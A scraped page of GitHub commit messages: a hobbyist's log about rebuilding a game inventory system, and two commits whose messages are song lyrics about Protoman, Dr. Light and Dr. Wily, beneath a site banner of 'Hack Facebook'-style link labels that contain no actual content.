Hack FacebookHack Facebook Hack TiktokHack Tiktok Hack InstagramHack Instagram Hack MessengerHack Messenger Hack WhatsappHack Whatsapp Hack GmailHack Gmail Hack TwitterHack Twitter Hack SnapchatHack Snapchat Track CellphoneTrack Cellphonet CONTACT

---
## [guest3444307/OneshotGB](https://github.com/guest3444307/OneshotGB)@[0fd79a0a82...](https://github.com/guest3444307/OneshotGB/commit/0fd79a0a8267e488a8da94563a00a70c8be047a4)
#### Wednesday 2022-04-13 22:50:02 by guest3444307

4/13/22 update

4/13/22: More inventory stuff, interaction doesn't work but item slots 1-3 should show the proper items in the slot, also i have no clue how i did item slots before... I'm not joking i spent like 30 minutes looking for how i did it, and i could not figure it out. This is why im making a new inventory system from scratch, that old inventory system is a ancient dragon to fight against every single time since i did not use scripts, so every change i made i had to paste across everything, it was horrible and it was the cause of 90% of bugs in the game while debugging. (time at least, because when your nested if statements become so long that you have to literally drag the block based coding sidebar (not sure what to call it) to even see, you have a problem.) I was happy when i finished the inventory system since finally, i dont have to touch it anymore. Sorry for rambling, had to get that off my chest. Oh also in changes, if i did this right i set it to 14 actors on screen total in a scene just for the new inventory system, though im questioning if i need it to be like this or if i could just mimic a scrolling inventory system by changing all the actors instead of making a actual scrolling inventory system (though that would enter into hell territory!)

---
## [JonMazu/NameSorter](https://github.com/JonMazu/NameSorter)@[d9629db365...](https://github.com/JonMazu/NameSorter/commit/d9629db36580b7d59f0108df341d344ce1580661)
#### Wednesday 2022-04-13 23:35:11 by JonaMaz

brokeman act 2

this fixes the bug

Albert:
Tonight the streets are red,
the lights are blue and blinding.
No sign of the "Good Doctor,"
but the siren's wail and whining
Tell us he'll be found.

I can almost hear the hounds...

What kind of man builds a machine to kill a girl?
No he did not use his hands.
Like a smart man he used a tool.
But just the same,
How can you question who's to blame?

Reporters:
What was her name?

Albert:
It doesn't matter.
Now listen...
"The Good Doctor" has to pay!

When I say he was a monster,
when I set fire to his name,
It does not matter where you hear it from,
whether truth or lies,
It gets said all the same.

Whatever's on the table plays!

---
## [JonMazu/NameSorter](https://github.com/JonMazu/NameSorter)@[3b8caf4ae2...](https://github.com/JonMazu/NameSorter/commit/3b8caf4ae27a27040c0975af93c7a15a7de37599)
#### Wednesday 2022-04-13 23:35:57 by JonaMaz

brokeman act 1

Narrator: No one was left who could remember how it had happened,
how the world had fallen under darkness.
At least no one who would do anything.
No one who would oppose the robots.
No one who would challenge their power,
or so Dr. Wily believed...

Twenty floors above the dark streets of the city,
Dr. Light lived in a run-down tenement.
An eccentric and brilliant man.
Light was a loner, a thinker, a man of ideas.
Ideas forbidden in Wily's society.
The society for which he worked.
The society in which he lived.
The society that he would set free.
And so Light worked, far into the night,
when the watchful eyes of Wily's robots weren't upon him.
He'd set his skillful hands to the task of creating a device
to bring about a change, to create a machine to bring freedom,
to create a man to save the world.
Twelve years Light worked and on a cold night in the year 200X,
Protoman was born.
A perfect man, an unbeatable machine,
hell-bent on destroying every evil standing between man and freedom,
built for one purpose, to destroy Wily's army of evil robots.
Ready, willing, prepared to fight.

Cutman
Gutsman
Elecman
Bombman
Fireman
Iceman
Proto

Fireman: Attack!

Narrator: And as the smoke cleared!
Wily rose above the countless robots remaining.
Protoman was wounded, low on energy,
struggling to remain standing as Wily ordered the final attack.
The death of Protoman.

The crowd had gathered there to watch him fall,
to watch their hopes destroyed.
They watched them beat him, they watched them break him,
they watched his last defense deployed.
There was not a man among them who would let himself be heard.
But from the crowd, from their collective fear,
arose these broken words:
We are the dead
We are the dead

Human Choir: What have we done?
Narrator: We are the dead
Human Choir: What will we do?
Narrator: We are the dead
Human Choir: Where will we turn?
Narrator: We are the dead
Human Choir: Is there nothing we can do?
Narrator: We are the dead
Human Choir: How did it come to this?
Narrator: We are the dead
Human Choir: How did we go so wrong?
Narrator: We are the dead
Human Choir: We are the dead

---

